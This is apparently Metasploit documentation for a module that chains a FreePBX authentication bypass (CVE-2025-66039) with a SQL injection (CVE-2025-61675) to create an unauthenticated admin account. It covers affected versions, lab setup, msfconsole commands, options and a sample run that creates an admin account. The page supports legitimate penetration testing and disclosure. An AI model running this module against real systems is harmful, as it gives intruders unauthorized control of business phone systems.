## Vulnerable Application

FreePBX is an open-source IP PBX management tool that provides a modern phone system for businesses
that use VoIP to make and receive phone calls.
Versions prior to 16.0.44, 16.0.92 and 17.0.6, 17.0.23 are vulnerable to multiple CVEs,
specifically CVE-2025-66039 and CVE-2025-61675, in the context of this module.
The versions before 16.0.44 and 17.0.23 are vulnerable
to CVE-2025-66039, while versions before 16.0.92 and 17.0.6 are vulnerable to CVE-2025-61675.
The former represents an authentication bypass: when
FreePBX uses Webserver Authorization Mode (an option the admin can enable), it allows an attacker to
authenticate as any user. The latter CVE describes multiple SQL injections; this module exploits the
SQL injection in the custom extension component.
The module chains these vulnerabilities into an unauthenticated SQL injection attack that creates a
new administrative user.

To setup the environment, perform minimal installation from [here](https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso).
Note that **Authorization Type** needs to be set to **webserver**:

1. Log into FreePBX Administration
1. Settings -> Advanced Settings
1. Change **Authorization Type** to **webserver**

Finally, the FreePBX needs to be activated to access vulnerable APIs:

1. Log into FreePBX Administraton
1. Admin -> System Admin
1. Activate instance

## Verification Steps

1. Install FreePBX
1. Start msfconsole
1. Do: `use auxiliary/gather/freepbx_custom_extension_injection`
1. Do: `set RHOSTS [target IP address]`
1. Do: `set USERNAME [FreePBX user]`
1. Do: `set NEW_USERNAME [new username]`
1. Do: `set NEW_PASSWORD [new password]`
1. Do: `run`


## Options

### NEW_USERNAME

Username for new administrative user.

### NEW_PASSWORD

Password for new administrative user.

### USERNAME

Performing authentication bypass requires the username of an existing user.

## Scenarios

```
msf auxiliary(gather/freepbx_custom_extension_injection) > set rhosts 192.168.168.223
rhosts => 192.168.168.223
msf auxiliary(gather/freepbx_custom_extension_injection) > set new_username msfuser1
new_username => msfuser1
smsf auxiliary(gather/freepbx_custom_extension_injection) > set new_password msflab
new_password => msflab
msf auxiliary(gather/freepbx_custom_extension_injection) > run verbose=true 
[*] Running module against 192.168.168.223
[*] Trying to create new administrative user
[+] New admin account: msfuser1/msflab
[*] Auxiliary module execution completed
```
